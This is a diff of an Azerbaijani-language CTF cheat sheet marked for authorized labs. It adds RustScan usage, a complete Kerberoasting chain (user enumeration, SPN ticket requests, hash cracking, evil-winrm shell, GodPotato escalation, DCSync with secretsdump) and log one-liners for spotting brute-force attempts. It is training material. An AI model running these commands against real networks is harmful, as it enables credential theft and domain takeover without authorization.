@@ -5,7 +5,6 @@
 > Qeyd: Yalnız təlim / icazəli lab mühitlərində istifadə üçün.
 
 ---
-https://notepad-plum.vercel.app/dashboard
 
 ## 🔗 FAYDALI LİNKLƏR (CTF köməkçiləri)
 
@@ -47,6 +46,18 @@ https://notepad-plum.vercel.app/dashboard
 nmap -sn 10.10.10.0/24                      # ping sweep
 nmap -p- --min-rate 5000 <IP>               # bütün portlar
 nmap -sC -sV -p<ports> <IP> -oN scan.txt    # service + script
+
+# RustScan — quraşdırma (wget ilə .deb)
+wget https://github.com/RustScan/RustScan/releases/download/2.1.1/rustscan_2.1.1_amd64.deb
+sudo dpkg -i rustscan_2.1.1_amd64.deb
+#   ən son versiya:  https://github.com/RustScan/RustScan/releases
+#   alternativ (cargo ilə):  cargo install rustscan
+
+# RustScan — istifadə (nmap-dan çox sürətli port tapır)
+rustscan -a <IP>                            # bütün portları tez tap
+rustscan -a <IP> -- -sC -sV                 # tapıb birbaşa nmap-a ötür
+rustscan -a <IP> --range 1-65535 -- -A      # tam aralıq + aqressiv
+rustscan -a <IP> -b 500                     # batch size (sürət tənzimi)
 
 # Web enumeration
 gobuster dir -u http://<IP> -w /usr/share/wordlists/dirb/common.txt
@@ -309,6 +320,90 @@ john --format=krb5tgs --wordlist=/usr/share/wordlists/rockyou.txt spn.hash
 crackmapexec smb <IP> -u users.txt -p 'Password123' --continue-on-success
 kerbrute passwordspray -d domain.local users.txt Password123
 ```
+
+#### 🎯 KERBEROASTING — TAM ZƏNCIR (recon → WinRM shell)
+
+```bash
+# ════════════════════════════════════════════════════════════
+# ADDIM 0 — RECON: DC-ni və domain adını tap
+# ════════════════════════════════════════════════════════════
+rustscan -a <IP> -- -sC -sV
+# Açıq portlar: 53,88(Kerberos),135,139,389(LDAP),445(SMB),5985(WinRM)...
+# 88 + 389 + 445 görürsənsə → bu Domain Controller-dir
+
+nmap --script smb-os-discovery -p445 <IP>     # hostname, domain, FQDN
+# Domain adını yadda saxla, məs:  lab.local   |   DC: DC01.lab.local
+
+# /etc/hosts-a əlavə et (Kerberos ad həllinə görə VACIBDIR):
+echo "<IP>  lab.local DC01.lab.local DC01" | sudo tee -a /etc/hosts
+
+# Saatı DC ilə sinxronla (Kerberos clock skew xətasının qarşısını alır):
+sudo ntpdate <IP>      # və ya:  sudo rdate -n <IP>
+
+# ════════════════════════════════════════════════════════════
+# ADDIM 1 — USER SİYAHISI topla (kerberoast üçün lazım)
+# ════════════════════════════════════════════════════════════
+# A) Null session işləyirsə:
+crackmapexec smb <IP> -u '' -p '' --users
+rpcclient -U "" -N <IP> -c "enumdomusers"
+enum4linux -U <IP>
+# B) RID brute (null tam bağlıdırsa):
+crackmapexec smb <IP> -u guest -p '' --rid-brute
+# C) Kerbrute ilə user mövcudluğunu yoxla (auth lazım deyil):
+kerbrute userenum -d lab.local --dc <IP> /usr/share/wordlists/usernames.txt
+# → tapılan userləri users.txt-ə yığ
+
+# ════════════════════════════════════════════════════════════
+# ADDIM 2 — KERBEROASTING: SPN ticket-lərini istə
+# ════════════════════════════════════════════════════════════
+# Ən azı 1 keçərli domain user lazımdır (parol və ya hash).
+# Creds varsa:
+impacket-GetUserSPNs lab.local/SHAWN_SANCHEZ:'Password123' -dc-ip <IP> -request -outputfile kerb.hash
+# Yalnız user var, parol yoxdursa (-no-pass — AS-REP/null icazəlidirsə):
+impacket-GetUserSPNs -request lab.local/SHAWN_SANCHEZ -dc-ip <IP> -no-pass -outputfile kerb.hash
+# Konkret SPN account-ı hədəflə:
+impacket-GetUserSPNs lab.local/user:pass -dc-ip <IP> -request-user sqlsvc
+
+# Nəticə: $krb5tgs$23$*sqlsvc$LAB.LOCAL$...  → kerb.hash faylında
+
+# ════════════════════════════════════════════════════════════
+# ADDIM 3 — HASH-İ CRACK ET (offline)
+# ════════════════════════════════════════════════════════════
+hashcat -m 13100 kerb.hash /usr/share/wordlists/rockyou.txt
+hashcat -m 13100 kerb.hash /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule
+# və ya john:
+john --format=krb5tgs --wordlist=/usr/share/wordlists/rockyou.txt kerb.hash
+hashcat -m 13100 kerb.hash --show          # crack olunmuş parolu göstər
+# → məs:  sqlsvc : Summer2024!
+
+# ════════════════════════════════════════════════════════════
+# ADDIM 4 — CREDS-İ TƏSDİQLƏ (hansı protokol açıqdır?)
+# ════════════════════════════════════════════════════════════
+crackmapexec smb <IP> -u sqlsvc -p 'Summer2024!'        # (Pwn3d! = admin)
+crackmapexec winrm <IP> -u sqlsvc -p 'Summer2024!'      # WinRM icazəsi?
+crackmapexec ldap <IP> -u sqlsvc -p 'Summer2024!'
+# "Pwn3d!" görsən → həmin protokolla shell ala bilərsən
+
+# ════════════════════════════════════════════════════════════
+# ADDIM 5 — WINRM SHELL (5985 açıq + icazə varsa)
+# ════════════════════════════════════════════════════════════
+evil-winrm -i <IP> -u sqlsvc -p 'Summer2024!'
+# içəridə:
+#   whoami /priv          → SeImpersonate varsa → GodPotato (priv-esc)
+#   type C:\Users\sqlsvc\Desktop\user.txt
+#   upload GodPotato-NET4.exe  /  download flag.txt
+
+# ════════════════════════════════════════════════════════════
+# ADDIM 6 — (əgər user deyil, admin lazımdırsa) PRIV-ESC / DCSync
+# ════════════════════════════════════════════════════════════
+# WinRM user-i admin deyilsə: BloodHound ilə yol tap, ya da:
+impacket-secretsdump lab.local/sqlsvc:'Summer2024!'@<IP> -just-dc   # DCSync (hüquq varsa)
+```
+
+> ⚠️ Tez-tez rast gəlinən xətalar:
+> • `KRB_AP_ERR_SKEW` → saat fərqi, `ntpdate <IP>` ilə düzəlt
+> • `Kerberos SessionError` → /etc/hosts-da domain/FQDN yazılmayıb
+> • SPN tapılmır → həmin user account-da SPN yoxdur, başqa user sına
 
 ### 1.4 Credential Access & Lateral Movement
 ```bash
@@ -772,12 +867,77 @@ journalctl -p err -b
 last / lastb                              # login tarixçəsi
 ```
 
+### 3.4.1 🔴 UĞURSUZ GİRİŞLƏR (Failed logins) — detallı
+```bash
+# --- SSH (Linux /var/log/auth.log və ya /var/log/secure) ---
+grep "Failed password" /var/log/auth.log                  # bütün uğursuzlar
+grep -c "Failed password" /var/log/auth.log               # NEÇƏ dəfə (say)
+grep "authentication failure" /var/log/auth.log
+grep "Invalid user" /var/log/auth.log                     # mövcud olmayan user cəhdləri
+
+# Hansı IP-dən neçə uğursuz cəhd (mənbə IP-ni çıxar):
+grep "Failed password" /var/log/auth.log | grep -oE "[0-9]+\.[0-9]+\.[0-9]+\.[0-9]+" | sort | uniq -c | sort -nr
+
+# Hansı USER-ə hücum olunub:
+grep "Failed password" /var/log/auth.log | awk '{print $(NF-5)}' | sort | uniq -c | sort -nr
+
+# Uğursuz vs uğurlu (eyni IP həm fail, həm accepted → brute uğurlu olub!):
+grep "Accepted password" /var/log/auth.log | grep -oE "[0-9]+\.[0-9]+\.[0-9]+\.[0-9]+" | sort -u
+```
+
+### 3.4.2 🔴 BRUTE-FORCE AŞKARLAMA (attack detection)
+```bash
+# === SSH brute-force ===
+# Bir IP-dən çoxlu uğursuz giriş = brute-force əlaməti:
+grep "Failed password" /var/log/auth.log \
+  | grep -oE "[0-9]+\.[0-9]+\.[0-9]+\.[0-9]+" \
+  | sort | uniq -c | sort -nr | head
+#   məs:  847 192.168.1.50   ← bu IP brute-force edir
+
+# Hücumçu IP-nin BÜTÜN aktivliyi (timeline):
+grep "192.168.1.50" /var/log/auth.log
+
+# Brute-force UĞURLU olubmu? (eyni IP-də fail çoxdur, sonra Accepted var):
+grep "192.168.1.50" /var/log/auth.log | grep "Accepted"
+#   nəticə varsa → hücumçu daxil olub, hansı user/vaxt:
+grep "192.168.1.50" /var/log/auth.log | grep "Accepted password"
+
+# === Web login brute-force (access.log) ===
+# Eyni IP-dən çoxlu POST /login (qısa müddətdə):
+grep "POST /login" access.log | awk '{print $1}' | sort | uniq -c | sort -nr | head
+
+# 401/403 (auth fail) status kodlarını IP üzrə say:
+awk '$9==401 || $9==403 {print $1}' access.log | sort | uniq -c | sort -nr
+
+# Eyni IP-dən qısa zamanda çox sorğu (rate-based detection):
+awk '{print $1}' access.log | sort | uniq -c | sort -nr | head -20
+
+# Uğurlu login (302 redirect / 200) brute-dan sonra:
+grep "POST /login" access.log | awk '$9==302 {print $1, $4}'
+```
+
+### 3.4.3 🔴 HTTP UĞURSUZ/XƏTA SORĞULARI
+```bash
+# Bütün 4xx (client error) və 5xx (server error):
+awk '$9 ~ /^4|^5/ {print $9}' access.log | sort | uniq -c | sort -nr
+
+# 404-lər (dir/file brute-force, gobuster izi):
+awk '$9==404 {print $7}' access.log | sort | uniq -c | sort -nr | head
+grep " 404 " access.log | awk '{print $1}' | sort | uniq -c | sort -nr   # kim 404 yaradır
+
+# 500-lər (exploit cəhdi serverdə xəta yaradıb — SQLi/LFI əlaməti):
+awk '$9==500 {print $1, $7}' access.log
+
+# Müvəffəqiyyətli exploit (404/403-dən sonra eyni URL-də 200):
+awk '$9==200 {print $7}' access.log | sort | uniq -c | sort -nr | head
+```
+
 ### 3.5 Faydalı One-liner-lər
 ```bash
 # Unikal IP sayı
 awk '{print $1}' access.log | sort -u | wc -l
 
-# Saat üzrə trafik paylanması
+# Saat üzrə trafik paylanması (spike = hücum vaxtı)
 awk '{print $4}' access.log | cut -d: -f2 | sort | uniq -c
 
 # Exfiltrasiya (böyük cavab ölçüləri)
@@ -785,7 +945,18 @@ awk '{print $10, $7}' access.log | sort -nr | head
 
 # İki loq faylını birləşdirib analiz
 cat *.log | grep "attacker_ip"
+
+# Top 10 hücumçu IP (404+401+403+500 cəmi):
+awk '$9 ~ /40[0-9]|500/ {print $1}' access.log | sort | uniq -c | sort -nr | head
+
+# Müəyyən vaxt aralığındakı hadisələr:
+awk '$4 >= "[25/Jun/2026:14:00" && $4 <= "[25/Jun/2026:15:00"' access.log
+
+# fail2ban-ın blokladığı IP-lər (varsa):
+grep "Ban " /var/log/fail2ban.log | awk '{print $NF}' | sort | uniq -c
 ```
+
+> 💡 **Brute-force-u tanımaq qaydası:** eyni mənbə IP + qısa zaman + çoxlu uğursuz cəhd (`Failed password` / 401 / 403). Sonra həmin IP-də `Accepted` / 200 / 302 axtarırsan — varsa, **hücum uğurlu olub**, hansı user və hansı vaxtda daxil olduğunu tapırsan.
 
 ---
 
